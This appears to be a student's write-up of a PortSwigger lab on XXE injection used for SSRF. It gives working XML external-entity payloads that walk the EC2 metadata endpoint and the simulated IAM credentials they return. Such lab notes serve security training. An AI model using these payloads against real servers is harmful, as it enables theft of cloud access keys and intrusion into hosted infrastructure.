# [Lab: Exploiting XXE to perform SSRF attacks](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf)

## Lab

This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.

The lab server is running a (simulated) EC2 metadata endpoint at the default URL, which is  `http://169.254.169.254/`. This endpoint can be used to retrieve data about the instance, some of which might be sensitive.

To solve the lab, exploit the  [XXE](https://portswigger.net/web-security/xxe)  vulnerability to perform an  [SSRF attack](https://portswigger.net/web-security/ssrf)  that obtains the server's IAM secret access key from the EC2 metadata endpoint.

## Analysis

check stock request:

```http
POST /product/stock HTTP/1.1
Content-Length: 107
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

the body:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
  <productId>
    1
  </productId>
  <storeId>
    1
  </storeId>
</stockCheck>
```

## tools

- burpsuite scanner: detected `Issue: XML external entity injection`

## Solutions

- 1:

  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
  <stockCheck>
    <productId>
      &xxe;
    </productId>
    <storeId>
      1
    </storeId>
  </stockCheck>
  ```

  => `"Invalid product ID: latest"`

- 2:

  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest"> ]>
  <stockCheck>
    <productId>
      &xxe;
    </productId>
    <storeId>
      1
    </storeId>
  </stockCheck>
  ```

  => `"Invalid product ID: meta-data"`

...

- final:

  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
  <stockCheck>
    <productId>
      &xxe;
    </productId>
    <storeId>
      1
    </storeId>
  </stockCheck>
  ```

  => `"Invalid product ID:`

  ```json
  {
    "Code" : "Success",
    "LastUpdated" : "2023-02-15T18:09:18.860870017Z",
    "Type" : "AWS-HMAC",
    "AccessKeyId" : "XLlrzSrLDa8sT3aBL9bT",
    "SecretAccessKey" : "AzVFWpMWA5BqJg9ikvNftbQO5HrQxwxeZ311Jddo",
    "Token" : "HZ3IwQ23B34thm6B8GNni9zEiG3Rk4CjzrDI3SG89iXC3leD5fZINGn1GB5g2I4pyGMb8s10G3WwhrrokuAufco04KAPFfz0bVyj6raGyIjMOAgzBxnYdpBYnNUu9u7T4YG11ho1jWqtKHTlOYbOzoL0MlNSJr4vQwtJoZx0iQ0LeR66nbgCztPQeXqL1ax8zLGTXqtAnA4iVpVlaSrUOB7UjH9Z84VleOFYBG2vlqof9Ne0C3NUilxkMHLwZwhr",
    "Expiration" : "2029-02-13T18:09:18.860870017Z"
  }```
